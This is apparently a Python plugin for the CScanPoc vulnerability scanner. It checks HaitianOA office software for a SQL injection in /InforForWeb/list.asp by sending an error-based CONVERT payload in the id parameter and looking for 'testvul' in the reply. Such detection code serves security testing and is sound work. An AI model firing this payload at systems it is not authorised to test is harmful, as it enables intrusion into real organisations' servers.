# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'HaitianOA_0001'  # 平台漏洞编号，留空
    name = 'HaitianOA系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-23'  # 漏洞公布时间
    desc = '''
        海天网络协同办公系统(海天OA)，是一套高质量、高效率、智能化的基于B/S结构的办公系统。产品特色：图形化流程设计、电子印章及手写签名痕迹保留等功能、灵活的工作流处理模式支持、完善的角色权限管理 、严密的安全性管理 、完备的二次开发特性。
        HaitianOA /InforForWeb/list.asp 参数过滤不完整，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=061213'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '海天OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '544103cf-8b08-4b8b-858c-a27b1dd7eb7b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/InforForWeb/list.asp?id="
            code, head, res, errorcode, _url = hh.http(
                arg + payload + 'CONVERT(int,%27test%27%2b%27vul%27)--')

            if code == 200 and 'testvul' in res:
                # security_hole(arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
